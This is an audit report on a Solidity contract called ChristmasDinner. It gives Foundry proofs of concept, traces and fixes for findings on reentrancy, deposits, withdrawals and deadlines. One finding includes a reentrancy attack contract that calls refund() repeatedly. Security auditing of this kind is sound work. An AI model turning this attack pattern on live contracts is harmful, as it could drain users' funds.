# Christmas Dinner Audit
- Scope
    - ChristmasDinner.sol  
- Findings
    - High: 6  
    (Valid-High) [H-01: `ChristmasDinner::nonReentrant()` modifier not working as expected](#high-01)  
    (Valid-Med) [H-02: Using Ether to deposit does not register the msg.sender as a participant](#high-02)  
    (Valid-High) [H-03: `ChristmasDinner::withdraw()` does not withdraw the Ether and Ether will be stuck in the contract forever after deadline has passed.](#high-03)  
    (Valid-High) [H-04: `ChristmasDinner::withdraw()` does not check for block.timestamp and allows host to withdraw before deadline, preventing users to get refund of ERC20 tokens](#high-04)  
    (Invalid) [H-05: Users can deposit 0 amount of tokens and still be participant](#high-05)  
    (Valid-Low) [H-06: Users can become participant by changing status before deadline](#high-06)  
    - Medium: 3  
    (Invalid) [M-01: `ChristmasDinner::deadline` is initialized as 0 and prevents users from depositing if the deadline is not set by host](#med-01)  
    (Valid-Med) [M-02: `ChristmasDinner::deadline` can be set unlimited times](#med-02)   
    (Valid-Low) [M-03: `ChristmasDinner::deposit()` is missing the feature to sign-up on behalf of other users](#med-03)  
    - Low: 2  
    (Valid-Med) [L-01: `transfer()` is deprecated and should not be used to transfer Ether](#low-01)  
    (Invalid) [L-02: The initial host cannot become the host again without depositing](#low-02)  
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## <a id="high-01"></a>H-01: `ChristmasDinner::nonReentrant()` modifier not working as expected

### Summary
The `ChristmasDinner::nonReentrant()` modifier is not working as expected, as it never sets `locked` as True before continuing with executing the function. Hence, `locked` will always be false and this modifier never really prevents reentrancy.

### Vulnerability Details
```
modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        _;
        locked = false;
    }
```

### Impact/Proof of Concept
We can see from the results that the transaction reverted due to "OutOfGas" by transfer() and not the error "No re-entrancy" from `ChristmasDinner::nonReentrant()` modifier
```
contract Exploit {
    ChristmasDinner cd;
    uint8 attempt = 1;

    constructor(ChristmasDinner _cd) payable {
        cd = _cd;
    }

    function attack() external {
        (bool success, ) = address(cd).call{value: 1 ether}("");
        require(success, "deposit failed");
        cd.refund();
    }

    receive() external payable {
        if(address(cd).balance > 0 && attempt < 3){
            console.log("Reenter");
            attempt += 1;
            cd.refund();
        } else {
            console.log("CD ETH: ", address(cd).balance);
            console.log("This ETH: ", address(this).balance);
        }
    }
}

function testReentrancyInRefundETH() public {
    vm.deal(user1, 5 ether);
    vm.deal(user2, 1 ether);

    // Simulate user 1 depositing 5 ether
    vm.startPrank(user1);
    (bool success1, ) = address(cd).call{value: 5 ether}("");
    require(success1, "Deposit ether failed for user 1");
    vm.stopPrank();

    // Simulate user 2 passing 1 ether to exploit contract and then deposit
    vm.startPrank(user2);
    Exploit exploit = new Exploit{value: 1 ether}(cd);
    exploit.attack();
    vm.stopPrank();
}
```
Results
```diff
[397814] ChristmasDinnerTest::testReentrancyInRefundETH()
    ├─ [0] VM::deal(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 5000000000000000000 [5e18])
    │   └─ ← [Return] 
    ├─ [0] VM::deal(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], 1000000000000000000 [1e18])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [24234] ChristmasDinner::receive{value: 5000000000000000000}()
    │   ├─ emit NewSignup(: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], : 5000000000000000000 [5e18], : true)
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Return] 
    ├─ [235627] → new Exploit@0x490452EE20b56a33EE7e98cC7dA68d009cFE49fe
    │   └─ ← [Return] 1064 bytes of code
    ├─ [84190] Exploit::attack()
    │   ├─ [24234] ChristmasDinner::receive{value: 1000000000000000000}()
    │   │   ├─ emit NewSignup(: Exploit: [0x490452EE20b56a33EE7e98cC7dA68d009cFE49fe], : 1000000000000000000 [1e18], : true)
    │   │   └─ ← [Stop] 
    │   ├─ [52327] ChristmasDinner::refund()
    │   │   ├─ [7310] ERC20Mock::transfer(Exploit: [0x490452EE20b56a33EE7e98cC7dA68d009cFE49fe], 0)
    │   │   │   ├─ emit Transfer(from: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], to: Exploit: [0x490452EE20b56a33EE7e98cC7dA68d009cFE49fe], value: 0)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [7310] ERC20Mock::transfer(Exploit: [0x490452EE20b56a33EE7e98cC7dA68d009cFE49fe], 0)
    │   │   │   ├─ emit Transfer(from: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], to: Exploit: [0x490452EE20b56a33EE7e98cC7dA68d009cFE49fe], value: 0)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [7310] ERC20Mock::transfer(Exploit: [0x490452EE20b56a33EE7e98cC7dA68d009cFE49fe], 0)
    │   │   │   ├─ emit Transfer(from: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], to: Exploit: [0x490452EE20b56a33EE7e98cC7dA68d009cFE49fe], value: 0)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2300] Exploit::receive{value: 1000000000000000000}()
->    │   │   │   └─ ← [OutOfGas] EvmError: OutOfGas
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] EvmError: Revert
```
### Recommendations
Set `locked` to True before executing the function
```diff
modifier nonReentrant() {
        require(!locked, "No re-entrancy");
+        locked = true;
        _;
        locked = false;
    }
```

## <a id="high-02"></a>H-02: Using Ether to deposit does not register the msg.sender as a participant

### Summary
When a user signs up using Ether, it does not register the user as a participant in `ChristmasDinner::participant`.

### Vulnerability Details
The receive() function records the Ether receive and emits the NewSignup event. However, it does not record the user as a participant in `ChristmasDinner::participant`.
```solidity
receive() external payable {
        etherBalance[msg.sender] += msg.value;
        emit NewSignup(msg.sender, msg.value, true);
    }
```

### Impact/Proof of Concept
1. Deposit ether by calling ChristmasDinner and transferring 5 ether
2. Check user's participation status and assert that it is false
```solidity
function testDepositEtherNotParticipant() public {
        vm.deal(user1, 5 ether);
        vm.startPrank(user1);
        (bool success1, ) = address(cd).call{value: 5 ether}("");
        require(success1, "Deposit ether failed for user 1");

        bool participated = cd.getParticipationStatus(user1);
        assertEq(participated, false, "User is participated");
    }
```
Results
```solidity
[PASS] testDepositEtherNotParticipant() (gas: 45663)
Traces:
  [45663] ChristmasDinnerTest::testDepositEtherNotParticipant()
    ├─ [0] VM::deal(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 5000000000000000000 [5e18])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [24234] ChristmasDinner::receive{value: 5000000000000000000}()
    │   ├─ emit NewSignup(: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], : 5000000000000000000 [5e18], : true)
    │   └─ ← [Stop] 
    ├─ [2571] ChristmasDinner::getParticipationStatus(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertEq(false, false, "User is participated") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.97s (305.87ms CPU time)
```
### Recommendations
Register the user as a participant if Ether is used to deposit.
```diff
receive() external payable {
        etherBalance[msg.sender] += msg.value;
+       participant[msg.sender] = true; 
        emit NewSignup(msg.sender, msg.value, true);
    }
```


## <a id="high-03"></a>H-03: `ChristmasDinner::withdraw()` does not withdraw the Ether and Ether will be stuck in the contract forever after deadline has passed.

### Summary
`ChristmasDinner::withdraw()` does not withdraw the Ether and the Ether will be stuck in the contract forever after deadline has passed. As `ChristmasDinner::refund()` will revert as deadline has passed

### Vulnerability Details
`ChristmasDinner::withdraw()` only withdraws the ERC20 tokens and not including Ether. Hence, the ether will be stucked in the contract after deadline.
```solidity
function withdraw() external onlyHost {
        address _host = getHost();
        i_WETH.safeTransfer(_host, i_WETH.balanceOf(address(this)));
        i_WBTC.safeTransfer(_host, i_WBTC.balanceOf(address(this)));
        i_USDC.safeTransfer(_host, i_USDC.balanceOf(address(this)));
    }
```

### Impact/Proof of Concept
1. User1 deposit the ERC20 tokens and Ether to ChristmasDinner contract
2. Deployer withdraws and only the ERC20 tokens are withdrawn. Leaving the Ether inside the contract
3. Fast forward past deadline, the Ether will be stucked as `ChristmasDinner::withdraw()` does not withdraw Ether and `ChristmasDinner::refund()` will revert when users call
```solidity
function testWithdrawDoesNotIncludeEther() public {
        // Note: WBTC, WETH, USDC are already minted and approved in _makeParticipants()
        uint256 amount = 2e18;
        vm.deal(user1, 5 ether);

        // User 1 deposits
        vm.startPrank(user1);
        cd.deposit(address(wbtc), amount);
        cd.deposit(address(weth), amount);
        cd.deposit(address(usdc), amount);
        (bool success1, ) = address(cd).call{value: 5 ether}("");
        require(success1, "Deposit ether failed for user 1");
        vm.stopPrank();
        console.log("Before withdraw()");
        console.log("CD WBTC: ", wbtc.balanceOf(address(cd)));
        console.log("CD WETH: ", weth.balanceOf(address(cd)));
        console.log("CD USDC: ", usdc.balanceOf(address(cd)));
        console.log("CD ETH: ", address(cd).balance);
        
        // Start prank deployer to withdraw
        vm.startPrank(deployer);
        cd.withdraw();

        console.log("\nAfter withdraw()");
        console.log("CD WBTC: ", wbtc.balanceOf(address(cd)));
        console.log("CD WETH: ", weth.balanceOf(address(cd)));
        console.log("CD USDC: ", usdc.balanceOf(address(cd)));
        console.log("CD ETH: ", address(cd).balance);

        assertEq(wbtc.balanceOf(address(cd)), 0, "WBTC not empty.");
        assertEq(weth.balanceOf(address(cd)), 0, "WETH not empty.");
        assertEq(usdc.balanceOf(address(cd)), 0, "USDC not empty.");
        assertEq(address(cd).balance, 5 ether, "Ether is empty");
        vm.stopPrank();
    
        // Fastforward 10days (past the deadline)
        vm.warp(10 days);
        vm.startPrank(user1);
        vm.expectRevert(ChristmasDinner.BeyondDeadline.selector);
        cd.refund();

        vm.stopPrank();
    }
```
Results
```diff
[PASS] testWithdrawDoesNotIncludeEther() (gas: 304700)
Logs:
  Before withdraw()
  CD WBTC:  2000000000000000000
  CD WETH:  2000000000000000000
  CD USDC:  2000000000000000000
  CD ETH:  5000000000000000000
  
After withdraw()
  CD WBTC:  0
  CD WETH:  0
  CD USDC:  0
  CD ETH:  5000000000000000000

Traces:
  ....
  ....
  ....
    ├─ [0] VM::warp(864000 [8.64e5])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [0] VM::expectRevert(BeyondDeadline())
    │   └─ ← [Return] 
    ├─ [2514] ChristmasDinner::refund()
->    │   └─ ← [Revert] BeyondDeadline()
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.85s (246.21ms CPU time)
```

### Recommendations
Include withdrawing Ether from the contract
```diff
function withdraw() external onlyHost {
        address _host = getHost();
        i_WETH.safeTransfer(_host, i_WETH.balanceOf(address(this)));
        i_WBTC.safeTransfer(_host, i_WBTC.balanceOf(address(this)));
        i_USDC.safeTransfer(_host, i_USDC.balanceOf(address(this)));
+        uint256 balance = address(this).balance;
+        (bool success, ) = address(_host).call{value: balance}("");
+        require(success);
    }
```

## <a id="high-04"></a>H-04: `ChristmasDinner::withdraw()` does not check for block.timestamp and allows host to withdraw before deadline, preventing users to get refund of ERC20 tokens

### Summary
`ChristmasDinner::withdraw()` is missing the check for block.timestamp, allowing the host to withdraw the tokens before deadline and users will not be able to get a refund before deadline.

### Vulnerability Details
The check for current block.timestamp is missing. Allowing host to withdraw before deadline and users will not be able to get a refund as the ERC20 tokens are already withdrawn
```solidity
function withdraw() external onlyHost {
    address _host = getHost();
    i_WETH.safeTransfer(_host, i_WETH.balanceOf(address(this)));
    i_WBTC.safeTransfer(_host, i_WBTC.balanceOf(address(this)));
    i_USDC.safeTransfer(_host, i_USDC.balanceOf(address(this)));
}
```

### Impact/Proof of Concept
1. User1 Deposit some tokens
2. Host withdraw before deadline
3. User1 wants to back out and refund before deadline, but transaction fails and revert
```solidity
function testWithdrawBeforeDeadline() public {
        // User1 deposits 2e18 WBTC
        vm.startPrank(user1);
        cd.deposit(address(wbtc), 2e18);
        vm.stopPrank();
        console.log("CD WBTC: ", wbtc.balanceOf(address(cd)));

        // Deployer withdraw the funds before deadline
        vm.startPrank(deployer);
        cd.withdraw();
        console.log("CD WBTC: ", wbtc.balanceOf(address(cd)));
        vm.stopPrank();
        
        // User1 tries to call refund() but transaction reverts because the WBTC token has already been withdrawn
        vm.startPrank(user1);
        vm.expectRevert();
        cd.refund();

        vm.stopPrank();
    }
```
Results
```diff
[PASS] testWithdrawBeforeDeadline() (gas: 148964)
Logs:
  CD WBTC:  2000000000000000000
  CD WBTC:  0

Traces:
  ....
  ....
  ....
    ├─ [12230] ChristmasDinner::refund()
    │   ├─ [5310] ERC20Mock::transfer(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 0)
    │   │   ├─ emit Transfer(from: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], to: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [919] ERC20Mock::transfer(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 2000000000000000000 [2e18])
->    │   │   └─ ← [Revert] ERC20InsufficientBalance(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b, 0, 2000000000000000000 [2e18])
    │   └─ ← [Revert] ERC20InsufficientBalance(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b, 0, 2000000000000000000 [2e18])
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.51s (263.19ms CPU time)
```

### Recommendations
Include check if block.timestamp is > deadline
```diff
function withdraw() external onlyHost {
+    require(block.timestamp > deadline);
    address _host = getHost();
    i_WETH.safeTransfer(_host, i_WETH.balanceOf(address(this)));
    i_WBTC.safeTransfer(_host, i_WBTC.balanceOf(address(this)));
    i_USDC.safeTransfer(_host, i_USDC.balanceOf(address(this)));
}
```

## <a id="high-05"></a>H-05: Users can deposit 0 amount of tokens and still be participant

### Summary
In `ChristmasDinner::deposit()`, users can deposit 0 amount of tokens and still become a participant.

### Vulnerability Details
The function is missing zero checks for _amount
```
function deposit(address _token, uint256 _amount) external beforeDeadline {
        if(!whitelisted[_token]) {
            revert NotSupportedToken();
        }
        if(participant[msg.sender]){
            balances[msg.sender][_token] += _amount;
            IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
            emit GenerousAdditionalContribution(msg.sender, _amount);
        } else {
            participant[msg.sender] = true;
            balances[msg.sender][_token] += _amount;
            IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
            emit NewSignup(msg.sender, _amount, getParticipationStatus(msg.sender));
        }
    }
```

### Impact/Proof of Concept
Deposit 0 amount of WBTC and participation status is True
```
function testDepositZeroAmountAndBeParticipant() public {
        vm.startPrank(user1);
        // Deposit 0 amount of WBTC
        cd.deposit(address(wbtc), 0);
        assertEq(cd.getParticipationStatus(user1), true, "User not participant");
        console.log("User1 participant: ", cd.getParticipationStatus(user1));
        vm.stopPrank();
    }
```
Results
```diff
[PASS] testDepositZeroAmountAndBeParticipant() (gas: 64143)
Logs:
  User1 participant:  true

Traces:
  [64143] ChristmasDinnerTest::testDepositZeroAmountAndBeParticipant()
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [44870] ChristmasDinner::deposit(ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   ├─ [10166] ERC20Mock::transferFrom(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 0)
    │   │   ├─ emit Transfer(from: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], to: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ emit NewSignup(: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], : 0, : true)
    │   └─ ← [Stop] 
    ├─ [571] ChristmasDinner::getParticipationStatus(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertEq(true, true, "User not participant") [staticcall]
    │   └─ ← [Return] 
    ├─ [571] ChristmasDinner::getParticipationStatus(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] true
    ├─ [0] console::log("User1 participant: ", true) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.10s (245.13ms CPU time)
```

### Recommendations
Add a zero check to require amount to be more than 0
```diff
function deposit(address _token, uint256 _amount) external beforeDeadline {
+    require(_amount > 0, "Insufficient amount");
    if(!whitelisted[_token]) {
        revert NotSupportedToken();
    }
    if(participant[msg.sender]){
        balances[msg.sender][_token] += _amount;
        IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
        emit GenerousAdditionalContribution(msg.sender, _amount);
    } else {
        participant[msg.sender] = true;
        balances[msg.sender][_token] += _amount;
        IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
        emit NewSignup(msg.sender, _amount, getParticipationStatus(msg.sender));
    }
}
```

## <a id="high-06"></a>H-06: Users can become participant by changing status before deadline

### Summary
`ChristmasDinner::changeParticipationStatus()` allows users to become a participant before the deadline without depositing any tokens or ether.

### Vulnerability Details
Users who have not deposit before will always return false when you call participant[msg.sender]. Hence, the function `ChristmasDinner::changeParticipationStatus()` allows any users to change their status to true before deadline.
```
function changeParticipationStatus() external {
        if(participant[msg.sender]) {
            participant[msg.sender] = false;
        } else if(!participant[msg.sender] && block.timestamp <= deadline) {
            participant[msg.sender] = true;
        } else {
            revert BeyondDeadline();
        }
        emit ChangedParticipation(msg.sender, participant[msg.sender]);
    }
```

### Impact/Proof of Concept
```
function testParticipateByChangingStatus() public {
        vm.startPrank(user1);
        // Without depositing any tokens or ether, just call changeParticipationStatus() before deadline
        cd.changeParticipationStatus();

        assertEq(cd.getParticipationStatus(user1), true, "User1 is not participant");
    }
```
Results
```diff
[PASS] testParticipateByChangingStatus() (gas: 39020)
Traces:
  [39020] CDTest::testParticipateByChangingStatus()
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [26604] ChristmasDinner::changeParticipationStatus()
    │   ├─ emit ChangedParticipation(: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], : true)
    │   └─ ← [Stop] 
    ├─ [638] ChristmasDinner::getParticipationStatus(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertEq(true, true, "User1 is not participant") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.19s (862.87µs CPU time)
```

### Recommendations
Add a mapping to track who are the users that have deposit before. Then check if the user exist before changing participant status.

## <a id="med-01"></a>M-01: `ChristmasDinner::deadline` is initialized as 0 and prevents users from depositing if the deadline is not set by host

### Summary
In the contract, the `ChristmasDinner::deadline` is initialized as 0 and if the host does not set the deadline, `ChristmasDinner::deposit()` will always revert on `BeyondDeadline()` and prevents users from depositing.


### Vulnerability Details
The modifier `beforeDeadline()` will revert because block.timestamp is bigger than 0.
```diff
modifier beforeDeadline() {
        if(block.timestamp > deadline) {
            revert BeyondDeadline();
        }
        _;
    }
```

### Impact/Proof of Concept
Note: The setDeadline() in setUp() has been commented out
```
function testCannotDepositIfDeadlineNotSet() public {
    vm.startPrank(user1);
    vm.expectRevert(ChristmasDinner.BeyondDeadline.selector);
    cd.deposit(address(wbtc), 2e18);
    vm.stopPrank();
}
```
Results
```diff
[PASS] testCannotDepositIfDeadlineNotSet() (gas: 15752)
Traces:
  [15752] ChristmasDinnerTest::testCannotDepositIfDeadlineNotSet()
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [0] VM::expectRevert(BeyondDeadline())
    │   └─ ← [Return] 
    ├─ [2534] ChristmasDinner::deposit(ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2000000000000000000 [2e18])
->    │   └─ ← [Revert] BeyondDeadline()
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.19s (64.38µs CPU time)
```

### Recommendations
Include setting deadline in the constructor
```diff
constructor (address _WBTC, address _WETH, address _USDC, uint256 _deadline) {
        host = msg.sender;
        i_WBTC = IERC20(_WBTC);
        whitelisted[_WBTC] = true;
        i_WETH = IERC20(_WETH);
        whitelisted[_WETH] = true;
        i_USDC = IERC20(_USDC);
        whitelisted[_USDC] = true;
+        deadline = _deadline;
+        deadlineSet = true;
    }
```

## <a id="med-02"></a>M-02: `ChristmasDinner::deadline` can be set unlimited times

### Summary
The deadline of the protocol can be set for unlimited times as `ChristmasDinner::deadlineSet` is never set as True by `ChristmasDinner::setDeadline()`.

### Vulnerability Details
`ChristmasDinner::setDeadline()` does not update `ChristmasDinner::deadlineSet` to true after updating
```
function setDeadline(uint256 _days) external onlyHost {
        if(deadlineSet) {
            revert DeadlineAlreadySet();
        } else {
            deadline = block.timestamp + _days * 1 days;
            emit DeadlineSet(deadline);
        }
    }
```

### Impact/Proof of Concept
After deadline is set once, we can set it again to another timestamp
```
function testDeadlineCanBeSetMultipleTimes() public {
        // Set deadline for the first time
        vm.startPrank(deployer);
        cd.setDeadline(1);
        console.log("deadline: ", cd.deadline());
        assertEq(cd.deadlineSet(), false, "deadlineSet is true");

        // Set deadline for the second time
        cd.setDeadline(2);
        console.log("deadline: ", cd.deadline());
        assertEq(cd.deadlineSet(), false, "deadlineSet is true");
        vm.stopPrank();
    }
```
Results
```diff
[PASS] testDeadlineCanBeSetMultipleTimes() (gas: 33254)
Logs:
  deadline:  86401
  deadline:  172801

Traces:
  [33254] ChristmasDinnerTest::testDeadlineCanBeSetMultipleTimes()
    ├─ [0] VM::startPrank(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   └─ ← [Return] 
    ├─ [10831] ChristmasDinner::setDeadline(1)
    │   ├─ emit DeadlineSet(: 86401 [8.64e4])
    │   └─ ← [Stop] 
    ├─ [363] ChristmasDinner::deadline() [staticcall]
    │   └─ ← [Return] 86401 [8.64e4]
    ├─ [0] console::log("deadline: ", 86401 [8.64e4]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [399] ChristmasDinner::deadlineSet() [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertEq(false, false, "deadlineSet is true") [staticcall]
    │   └─ ← [Return] 
    ├─ [1931] ChristmasDinner::setDeadline(2)
    │   ├─ emit DeadlineSet(: 172801 [1.728e5])
    │   └─ ← [Stop] 
    ├─ [363] ChristmasDinner::deadline() [staticcall]
    │   └─ ← [Return] 172801 [1.728e5]
    ├─ [0] console::log("deadline: ", 172801 [1.728e5]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [399] ChristmasDinner::deadlineSet() [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertEq(false, false, "deadlineSet is true") [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.01s (891.26ms CPU time)
```

### Recommendations
Update the bool deadlineSet to True after setting the deadline
```diff
function setDeadline(uint256 _days) external onlyHost {
        if(deadlineSet) {
            revert DeadlineAlreadySet();
        } else {
            deadline = block.timestamp + _days * 1 days;
+            deadlineSet = true;
            emit DeadlineSet(deadline);
        }
    }
```

## <a id="med-03"></a>M-03: `ChristmasDinner::deposit()` is missing the feature to sign-up on behalf of other users

### Summary
The `ChristmasDinner::deposit()` function is suppose to include the feature to sign-up on behalf other users but it is missing.

### Vulnerability Details
```
function deposit(address _token, uint256 _amount) external beforeDeadline {
        if(!whitelisted[_token]) {
            revert NotSupportedToken();
        }
        if(participant[msg.sender]){
            balances[msg.sender][_token] += _amount;
            IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
            emit GenerousAdditionalContribution(msg.sender, _amount);
        } else {
            participant[msg.sender] = true;
            balances[msg.sender][_token] += _amount;
            IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
            emit NewSignup(msg.sender, _amount, getParticipationStatus(msg.sender));
        }
    }
```

### Impact/Proof of Concept
As stated in the protocol documentation to allow a user to sign-up on behalf of other users. However, `ChristmasDinner::deposit()` is missing this feature.

### Recommendations
Add in the logic to allow a user to sign-up on behalf of other users.


## <a id="low-01"></a>L-01: `transfer()` is deprecated and should not be used to transfer Ether

### Summary
In `ChristmasDinner::_refundETH()`, transfer() is used to send ether. This is not recommended as transfer() sends a fixed gas of 2300 and is deprecated, which may not be sufficient in the future if the EVM gas costs changes. This will cause the funds in the contract to be stucked.

### Vulnerability Details
```diff
function _refundETH(address payable _to) internal {
        uint256 refundValue = etherBalance[_to];
->        _to.transfer(refundValue); 
        etherBalance[_to] = 0;
    }
```

### Impact/Proof of Concept
Sent gas may not be sufficient in the future if the EVM gas costs changes. This will cause the funds in the contract to be stucked.

### Recommendations
transfer() has been deprecated and call() should be used instead.
```diff
function _refundETH(address payable _to) internal {
        uint256 refundValue = etherBalance[_to];
-        _to.transfer(refundValue); 
+       (bool success,) = _to.call{value: refundValue}("");
+        require(success); 
        etherBalance[_to] = 0;
    }
```

## <a id="low-02"></a>L-02: The initial host cannot become the host again without depositing

### Summary
If the initial host handed over the role to another participant, he/she cannot become the host again without depositing as he/she is not registered as a participant.

### Vulnerability Details
```diff
function changeHost(address _newHost) external onlyHost {
        if(!participant[_newHost]) {
            revert OnlyParticipantsCanBeHost();
        }
        host = _newHost;
        emit NewHost(host);
    }
```

### Impact/Proof of Concept
```
function testHostCannotBecomeHostAgain() public {
        // User1 deposits and become participant
        vm.startPrank(user1);
        cd.deposit(address(wbtc), 2e18);
        vm.stopPrank();
        assertEq(cd.getParticipationStatus(user1), true, "User not participant");

        // Initial host hand over role to user1
        vm.startPrank(deployer);
        cd.changeHost(user1);
        vm.stopPrank();
        assertEq(cd.host(), user1, "User1 is not host");

        // User1 hand back host role to initial host but fails
        vm.startPrank(user1);
        vm.expectRevert(ChristmasDinner.OnlyParticipantsCanBeHost.selector);
        cd.changeHost(deployer);
        vm.stopPrank();
    }
```
Results
```diff
[PASS] testHostCannotBecomeHostAgain() (gas: 112396)
Traces:
  [112396] ChristmasDinnerTest::testHostCannotBecomeHostAgain()
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [90270] ChristmasDinner::deposit(ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2000000000000000000 [2e18])
    │   ├─ [35666] ERC20Mock::transferFrom(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 2000000000000000000 [2e18])
    │   │   ├─ emit Transfer(from: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], to: ChristmasDinner: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], value: 2000000000000000000 [2e18])
    │   │   └─ ← [Return] true
    │   ├─ emit NewSignup(: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], : 2000000000000000000 [2e18], : true)
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [571] ChristmasDinner::getParticipationStatus(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertEq(true, true, "User not participant") [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   └─ ← [Return] 
    ├─ [6902] ChristmasDinner::changeHost(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   ├─ emit NewHost(: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [414] ChristmasDinner::host() [staticcall]
    │   └─ ← [Return] user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]
    ├─ [0] VM::assertEq(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], "User1 is not host") [staticcall]
